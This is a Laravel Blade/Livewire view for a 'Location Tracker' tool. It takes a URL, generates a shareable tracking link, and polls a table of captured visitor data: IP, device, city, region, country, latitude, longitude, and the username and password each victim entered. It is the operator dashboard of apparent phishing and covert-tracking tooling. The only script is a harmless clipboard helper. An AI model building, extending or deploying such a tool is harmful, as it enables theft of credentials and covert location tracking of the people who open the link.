<div wire:poll.5s>

    <div class="row mt-4 ml-4 mr-4">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header d-flex justify-content-between">
                    <div class="header-title">
                        <h4 class="card-title">Location Tracker </h4>
                    </div>

                </div>
                <div class="card-body">

                    @if (session()->has('success'))
                    <div class="alert alert-success" role="alert">
                        <div class="iq-alert-text">{{ session('success') }}</div>
                    </div>
                    @endif
                    @if (session()->has('error'))
                    <div class="alert alert-danger" role="alert">
                        <div class="iq-alert-text">{{ session('error') }}</div>
                    </div>
                    @endif
                    @if (!$link)
                    <div class="form-group">
                        <label for="search-text">URL</label>
                        <input wire:model.defer="url" type="text" class="form-control">
                        @error('url')
                        <div class="text-danger mt-2">
                            {{ $message }}
                        </div>
                        @enderror
                    </div>
                    @else
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text" id="inpField">{{ $link }}</span>
                        </div>
                        <button class="btn btn-outline-info btn-sm" data-clipboard-target="#copy_{{ $link }}"
                            id="btnField" wire:click="copyToClipboard">COPY</button>
                    </div>

                    @endif
                    @if ($link)
                    <div class="text-right">
                        <button type="submit" class="btn btn-primary mr-2" wire:click.prevent="regenerate">Generate
                            New</button>
                    </div>

                    @else
                    <div class="text-right">
                        <button type="submit" class="btn btn-primary mr-2" wire:click.prevent="submit">Submit</button>
                    </div>

                    @endif
                    </form>
                </div>
            </div>
        </div>

        <div class="col-md-12">

            <div class="card" wire:poll.5s="getLocations">
                <div class="card-body">
                    <table class="table table-sm">
                        <thead>
                           <tr>
                              <th scope="col">#</th>
                              <th scope="col">IP Address</th>
                              <th scope="col">Device</th>
                              <th scope="col">City</th>
                              <th scope="col">Region</th>
                              <th scope="col">Country</th>
                              <th scope="col">Latitude</th>
                              <th scope="col">Longitude</th>
                              <th scope="col">Username</th>
                              <th scope="col">Password</th>
                           </tr>
                        </thead>
                        <tbody>
                            @forelse ($locations as $location)
                                <tr>
                                    <td>{{ $loop->iteration }}</td>
                                    <td>{{ $location->ip }}</td>
                                    <td>{{ $location->device }}</td>
                                    <td>{{ $location->city }}</td>
                                    <td>{{ $location->region }}</td>
                                    <td>{{ $location->country }}</td>
                                    <td>{{ $location->latitude }}</td>
                                    <td>{{ $location->longitude }}</td>
                                    <td>{{ $location->username }}</td>
                                    <td>{{ $location->password }}</td>
                                </tr>
                            @empty
                            <tr>
                                <td colspan="8" class="text-center">No Data</td>
                            </tr>
                            @endforelse
                        </tbody>
                     </table>
                </div>
            </div>

        </div>
    </div>
    
    </div>
    </div>

</div>

@push('js')

{{-- <script>
    window.addEventListener('copy-to-clipboard', event => {
        const link = event.detail;
        navigator.clipboard.writeText(link)
            .then(() => {
                console.log('Value copied to clipboard:', link);
            })
            .catch((error) => {
                console.error('Failed to copy value to clipboard:', error);
            });
    });
</script> --}}

<script>
    document.addEventListener('copy-to-clipboard', function (e) {
        const textToCopy = e.detail;
        const textarea = document.createElement('textarea');
        textarea.value = textToCopy;
        textarea.setAttribute('readonly', '');
        textarea.style.position = 'absolute';
        textarea.style.left = '-9999px';
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
    });
</script>

@endpush